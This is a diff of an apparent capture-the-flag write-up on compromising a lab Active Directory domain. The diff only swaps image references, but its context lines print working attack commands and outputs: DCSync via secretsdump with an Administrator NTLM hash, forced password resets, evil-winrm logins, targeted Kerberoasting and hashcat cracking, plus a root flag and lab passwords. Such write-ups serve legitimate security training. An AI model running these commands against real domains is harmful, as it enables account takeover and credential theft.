@@ -280,7 +280,7 @@ BloodHound confirmed that `ethan` held direct `DCSync`-capable rights (`GetChang
 secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@10.129.67.141
 ```
 
-*(See `./images/Pasted_image_20260922195613.png` for the full secretsdump output, including the Administrator NTLM hash.)*
+![Full secretsdump output, including the Administrator NTLM hash.](./images/admin_hash)
 
 **Findings:** With DCSync rights, `ethan` was able to impersonate a Domain Controller and request password data via the Directory Replication Service (DRS) protocol for every domain account, including `Administrator`.
 
@@ -294,7 +294,7 @@ dir
 cat root.txt
 ```
 
-*(See `./images/Pasted_image_20260922195744.png` for the Administrator shell and root flag capture.)*
+![Administrator shell and root flag capture.](./images/root_flag)
 
 **Root flag:** `f9174e663761cec3b3ec56d8834b45a5`
 
@@ -320,9 +320,6 @@ cat root.txt
 secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@10.129.67.141
 → Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
 ```
-
-`./images/dcsync_ethan.png`, `./images/Pasted_image_20260922195613.png`
-
 ---
 
 ### 2. Excessive `GenericAll` Rights Enabling Full Account Takeover — Critical
@@ -344,9 +341,6 @@ net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebed
 → evil-winrm -i 10.129.67.141 -u michael -p 'password'
 → whoami: administrator\michael
 ```
-
-`./images/genericall_olivia_michael.png`, `./images/genericall_help.png`, `./images/changed_password_micahel.png`
-
 ---
 
 ### 3. `ForceChangePassword` Rights Enabling Unauthorized Password Resets — High
@@ -367,8 +361,6 @@ net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebed
 Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
 → benjamin's password successfully reset to a known value
 ```
-
-`./images/forcechangepassword.png`
 
 ---
 
@@ -391,9 +383,6 @@ python3 targetedKerberoast.py -v --dc-ip '10.129.67.141' -d administrator.htb -u
 → $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$...
 → cracked: ethan:limpbizkit
 ```
-
-`./images/genricwrite-emily.png`, `./images/targetedkerboroast_command.png`, `./images/krb5tg.png`, `./images/password_ethan.png`
-
 ---
 
 ### 5. Plaintext Credential Database Accessible via FTP with Weak Master Password — Medium
@@ -416,8 +405,6 @@ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt.gz
 
 Password Safe → alexander / emily / emma credentials recovered
 ```
-
-`./images/ftp_login.png`, `./images/password_file_password.png`, `./images/password_safe.png`, `./images/confirmed_passwords.png`
 
 ---
 
